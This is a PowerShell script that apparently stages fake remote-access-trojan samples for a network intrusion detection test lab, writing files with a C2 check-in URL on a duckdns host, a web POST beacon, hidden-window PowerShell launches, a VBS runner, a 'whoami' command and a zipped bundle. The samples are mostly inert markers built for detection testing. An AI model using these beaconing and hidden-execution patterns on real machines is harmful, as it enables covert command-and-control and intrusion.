[CmdletBinding()]
param(
    [string]$WorkspaceRoot = "C:\NIDS_Workspace",
    [string]$TargetDir = ""
)

$ErrorActionPreference = "Stop"

$workspaceRootResolved = [System.IO.Path]::GetFullPath($WorkspaceRoot)
$incomingRoot = Join-Path $workspaceRootResolved "NIDS_TestLab\artifacts\incoming"
$runToken = "rat-backdoor-static-$(Get-Date -Format yyyyMMdd-HHmmss)"
$targetDirResolved = if ($TargetDir.Trim() -ne "") {
    [System.IO.Path]::GetFullPath($TargetDir)
} else {
    Join-Path $incomingRoot $runToken
}

New-Item -ItemType Directory -Force -Path $targetDirResolved | Out-Null

@'
$c2 = "https://alpha-rat.duckdns.org/api/checkin"
powershell -NoProfile
$mode = "reverse shell"
Invoke-WebRequest -Uri $c2 -Method Post
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "01_reverse_shell.ps1") -Encoding ASCII

@'
import subprocess

profile = "reverse shell"
subprocess.Popen("cmd.exe /c whoami", shell=True)
print(profile)
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "02_beacon_client.py") -Encoding ASCII

@'
{
  "server": "alpha-rat.duckdns.org",
  "command": "checkin",
  "token": "sample-bot-token",
  "interval": 30
}
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "03_c2_profile.json") -Encoding ASCII

@'
@echo off
powershell -nop -w hidden -c echo reverse shell
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "04_persist_helper.bat") -Encoding ASCII

@'
Remote support contact list
1. VPN helpdesk
2. Endpoint team
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "05_remote_support_notes.txt") -Encoding ASCII

$archiveSeedRoot = Join-Path $targetDirResolved "_rat_archive_seed"
$dropRoot = Join-Path $archiveSeedRoot "bundle"
New-Item -ItemType Directory -Force -Path $dropRoot | Out-Null

@'
Set sh = CreateObject("WScript.Shell")
sh.Run "powershell -nop -c echo reverse shell", 0
'@ | Set-Content -LiteralPath (Join-Path $dropRoot "agent.vbs") -Encoding ASCII

@'
MZ
Safe backdoor helper fixture.
cmd.exe
reverse shell
http://example.invalid/c2
'@ | Set-Content -LiteralPath (Join-Path $dropRoot "helper.exe") -Encoding ASCII

$zipPath = Join-Path $targetDirResolved "06_rat_bundle.zip"
Compress-Archive -Path (Join-Path $dropRoot "*") -DestinationPath $zipPath -Force
Remove-Item -LiteralPath $archiveSeedRoot -Recurse -Force

Write-Output "Staged: $targetDirResolved"
